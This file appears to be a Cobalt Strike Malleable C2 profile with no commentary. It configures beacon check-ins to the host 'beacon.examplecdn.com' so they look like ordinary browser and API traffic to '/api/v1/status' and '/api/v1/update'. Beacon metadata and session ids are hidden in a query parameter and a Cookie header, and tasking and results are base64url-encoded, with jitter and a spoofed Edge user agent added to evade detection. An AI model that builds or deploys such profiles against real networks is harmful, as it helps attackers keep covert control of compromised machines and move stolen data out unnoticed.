set sleeptime "5000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edge/125.0.0.0";

https-certificate {
    set CN "beacon.examplecdn.com";
}

http-get {
    set uri "/api/v1/status";

    client {
        header    "Accept" "*/*";
        parameter "q" "c9e7ac49-fb26-4d5c-9e37-0d679818f3ce";

        metadata {
            base64url;
            uri-append;
        }
    }

    server {
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        header "Connection"    "close";

        output {
            base64url;
            print;
        }
    }
}

http-post {
    set uri "/api/v1/update";

    client {
        header "Content-Type" "application/x-www-form-urlencoded";

        id {
            base64url;
            header "Cookie";
        }

        output {
            base64url;
            print;
        }
    }

    server {
        header "Cache-Control" "no-cache";
        header "Connection"    "close";

        output {
            base64url;
            print;
        }
    }
}
